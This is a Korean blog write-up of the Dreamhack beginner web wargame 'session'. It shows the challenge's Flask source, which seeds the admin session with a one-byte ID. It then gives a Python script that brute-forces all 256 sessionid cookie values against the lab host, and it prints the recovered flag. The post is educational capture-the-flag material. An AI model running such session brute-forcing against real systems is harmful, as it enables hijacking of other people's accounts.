---
title: "🔒 (B) session"
date: 2025-08-08 00:00:00 +0900
categories: ["< Dreamhack >", Wargame, "- Web"]
tags: [dreamhack, wargame, beginner, session, brute force, python]
published: true
password: "tjwjddltoddlf"
abstract: "해당글은 비밀글 입니다."
message: "비밀번호를 입력하세요."
---

## Dreamhack / Wargame

---

#### Difficulty Level : Beginner  
#### Title : session

---

![session1](/assets/img/dreamhack/2025-08-08-14-42-56.png)

우선 문제 vm을 생성하고 접속해봤다.

![session2](/assets/img/dreamhack/2025-08-08-14-43-39.png)

로그인 화면이 보인다.

개발자 도구를 열어보니,

![session3](/assets/img/dreamhack/2025-08-08-14-44-21.png)

기본 계정은 `guest / guest` 라고 한다.

이걸 입력해서 로그인을 해보니 다음과 같이 나왔다.

![session4](/assets/img/dreamhack/2025-08-08-14-44-59.png)

> Hello guest, you are not admin

개발자 도구에서 쿠키도 확인해보니

![session5](/assets/img/dreamhack/2025-08-08-15-10-21.png)

`sessionid` 라는 이름으로 쿠키를 관리하고 있는 것을 볼 수 있었다.

<br>

이후에도 분석을 해봤지만 얻을 수 있는 정보는 없었다.

다음으로 문제에서 제공한 소스 코드를 읽어 봤다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'user': 'user1234',
    'admin': FLAG
}

session_storage = {
}

@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(4).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'

if __name__ == '__main__':
    import os
    session_storage[os.urandom(1).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)
```

<br>

여기서 눈여겨 봐야할 부분은 바로 맨 마지막 코드 부분이다.

```python
if __name__ == '__main__':
    import os
    session_storage[os.urandom(1).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)
```

`session_storage[key] = 'value'`
- session_storage는 딕셔너리 형태이다. (서버 메모리 세션 DB)
    - key : Session ID
    - value : username

`os.urandom(1)`
- 운영체제 레벨의 암호학적 난수 바이트를 1바이트(8비트) 뽑음
    - 뽑힐 수 있는 값(16진수로 각각 4비트씩 차지) : 00 ~ FF => **256가지**

`hex()`
- 바이트 열을 16진수 문자열로 변환. 
    - ex. b"\x07" -> "07"

`login` 라우트 부분에서 세션 쿠키를 설정할 때 **4바이트 난수**를 사용하지만,  
여기서는 admin 세션 생성에 **1바이트**을 사용하는 것을 볼 수 있다.

정리하면,
서버가 시작될 때 무작위 2자리 16진수 문자열을 session ID로 하여 관리자 계정 세션을 미리 등록한다.
따라서 클라이언트가 이 값을 알아내면, sessionid 쿠키 값을 해당 문자열로 바꾸는 것만으로 admin 권한을 획득할 수 있을 것이다.

<br>

키 공간(경우의 수)는 256개 뿐이기에 Brute Force를 통해 충분히 탈취해볼만 하다.

sessionid 값을 00~ff 까지 바꿔가며 요청을 보내보고,  
"flag is" 라는 값이 나오면 화면에 출력되도록 스크립트를 작성해보자.
("flag is"라는 포멧은 '/' 라우트에서 확인할 수 있었음)

<br>

### 작성한 소스코드 (Python)

(pip 를 이용해 requests 모듈을 미리 설치해주어야 함)

```python
import requests

url = "http://host8.dreamhack.games:20075/"
for i in range(256):
    sessionid = f"{i:02x}"
    r = requests.get(url, cookies={"sessionid": sessionid})
    if "flag is" in r.text:
        print("admin sessionid:", sessionid)
        print(r.text)
        break
```
(bruteForce.py)

실행하면?

`python3 bruteForce.py`

![session6](/assets/img/dreamhack/2025-08-08-15-39-07.png)

admin으로 로그인되면서 플래그를 얻을 수 있게 된다.

<br>

flag : ~~DH{73b3a0ebf47fd6f68ce623853c1d4f138ad91712}~~



